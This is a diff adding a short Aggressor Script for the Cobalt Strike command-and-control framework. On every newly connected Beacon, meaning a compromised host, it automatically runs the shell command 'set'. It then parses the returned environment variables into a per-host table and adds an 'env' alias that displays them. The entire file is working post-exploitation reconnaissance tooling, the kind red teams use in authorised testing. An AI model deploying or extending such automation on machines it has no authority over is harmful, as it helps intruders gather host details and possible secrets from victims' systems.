@@ -1,0 +1,35 @@
+#
+# Aggressor Script means to parse/use environment vars in a Beacon session.
+#
+
+global('%bvars');
+
+# request environment variables for every new Beacon that comes in.
+on beacon_initial {
+	# ideally, we'd have a bshell that could take callbacks. We don't have
+	# this yet. Eventually though, we will.
+	bshell($1, "set");
+}
+
+# parse environment vars from beacon output
+on beacon_output {
+	# do nothing if we already know the env variables
+	if ($1 in %bvars) {
+		return;
+	}
+	# verify this is output for the set command 
+	else if ("*APPDATA=*" iswm $2) {
+		local('$temp $key $value');
+		foreach $temp (split("\r\n", $2)) {
+			if ($temp ismatch '(.*?)=(.*)') {
+				($key, $value) = matched();
+				%bvars[$1][$key] = $value;			
+			}
+		}
+	}
+}
+
+# $1 = bid, $2 = variable
+alias env {
+	blog($1, "$2 is: '" . %bvars[$1][$2] . "'");
+}
